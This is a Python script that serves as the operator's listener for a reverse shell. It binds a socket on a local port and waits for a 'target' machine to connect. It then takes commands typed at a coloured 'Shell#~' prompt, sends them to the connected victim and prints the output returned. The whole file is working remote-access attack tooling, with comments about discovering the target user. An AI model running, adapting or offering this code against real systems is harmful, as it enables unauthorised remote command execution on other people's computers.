#!/usr/share/python3
# SOCKET
#       BIND
#           LISTEN
#                 ACCEPT

import socket
import json
import os
import colorama 
from colorama import Fore, Back
colorama.init(autoreset=True)

os.system('cls') # allows for color in input

def reliable_send(data):
	json_data = json.dumps(data).encode()
	target.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue

def shell():
	while True:
		command = input(Fore.YELLOW + "* Shell#~%s: " % str(ip) + Fore.GREEN) # %s  is the IP to be attached to this string
		reliable_send(command)
		if command == "q":
                	break
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command == "id":
			try:
				user = os.getlogin() # id discovers the user on the listening machine. Run whoami for target user
				print(Fore.RED + user)
			except:
				continue
		else:
				result = reliable_recv()
				print (Back.BLUE,result)

def server ():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # starts socket api to send messages across network 
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("127.0.0.1",54321))  #ip of host + desired port
	s.listen(5) 
	print ("LISTENING FOR INCOMING CONNECTIONS")
	target, ip = s.accept()
	print ("Target connected!")

server()
shell()
s.close()
